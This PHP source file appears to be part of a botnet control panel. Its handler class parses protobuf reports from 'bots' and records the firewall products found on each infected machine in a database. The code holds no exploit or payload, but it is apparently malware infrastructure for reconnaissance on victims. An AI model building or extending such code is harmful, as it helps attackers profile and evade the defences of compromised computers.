<?php

require_once 'ReportHandler.php';
require_once 'application/modules/protobuf/pb_proto_protocol.php';

class ReportFirewallsHandler extends ReportHandler
{
    public function grabDataFromProtobuf($input_data, $botid)
    {
        $reportFirewalls = new reportFirewalls();
        $reportFirewalls->ParseFromString($input_data);
        $this->data = $reportFirewalls->getAssocArray();
        $this->data['bot_id'] = $this->getRowIdByBotId($botid);
    }

    public function storeDataToServer()
    {
        try
        {
            if ($this->dataIsEmpty())
            {
                return false;
            }

            $this->getDB()->beginTransaction();

            $firewalls = explode(';', $this->data['firewalls_list']);
            foreach ($firewalls as $firewall)
            {
                if (empty($firewall) || $this->rowIsExist($this->data['bot_id'], $firewall))
                {
                    continue;
                }
                $this->getDB()->insert('reports_firewall', array('bot_id' => $this->data['bot_id'], 'name' => $firewall));
            }
            $this->getDB()->commit();
        }
        catch (Exception $e)
        {
            $this->getDB()->rollBack();
            Logger::Error('ReportFirewallsHandler', 'storeDataToServer (exception)', $e, null, json_encode($this->data));
            return false;
        }
        return true;
    }

    protected function dataIsEmpty()
    {
        if (empty($this->data['firewalls_list']))
            return true;
        return false;
    }

    private function rowIsExist($botid, $name)
    {
        return $this->getDB()->count('reports_firewall', 'bot_id=:bot_id AND name=:name',
                array(':bot_id' => $botid, ':name' => $name)) > 0;
    }


}